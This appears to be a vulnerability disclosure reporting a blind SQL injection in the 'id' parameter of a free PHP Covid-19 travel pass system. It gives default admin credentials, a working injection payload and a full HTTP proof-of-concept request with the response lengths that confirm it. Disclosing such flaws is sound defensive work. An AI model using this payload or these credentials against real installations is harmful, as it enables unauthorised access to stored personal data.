# Covid-19 Travel Pass Management System v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15308/covid-19-travel-pass-management-system-phpoop-free-source-code.html

Vulnerability File: /ctpms/admin/applications/update_status.php?id=

Vulnerability location: /ctpms/admin/applications/update_status.php?id=,id

[+] Payload: /ctpms/admin/applications/update_status.php?id=1%27%20and%20length(database())%20=%208--+ // Leak place ---> id

Current database name: ctpms_db,length is 8

```sql
GET /ctpms/admin/applications/update_status.php?id=1%27%20and%20length(database())%20=%208--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=sbd29ujtf9eelnf4f6rlt8ikfi
Connection: close
```
When length (database ()) = 7, Content-Length: 1783

![image](https://user-images.githubusercontent.com/54017627/167082829-be853716-b6a2-4883-8324-44951b77f290.png)

![image](https://user-images.githubusercontent.com/54017627/167082899-30fe9807-3d9a-4500-820e-3ab212edbf9d.png)

When length (database ()) = 8, Content-Length: 1792

![image](https://user-images.githubusercontent.com/54017627/167082783-1b33e8c8-6b75-422b-85df-101b470d78ae.png)

![image](https://user-images.githubusercontent.com/54017627/167082871-da8d0e48-8536-4c05-879a-d1a069b2b8d7.png)
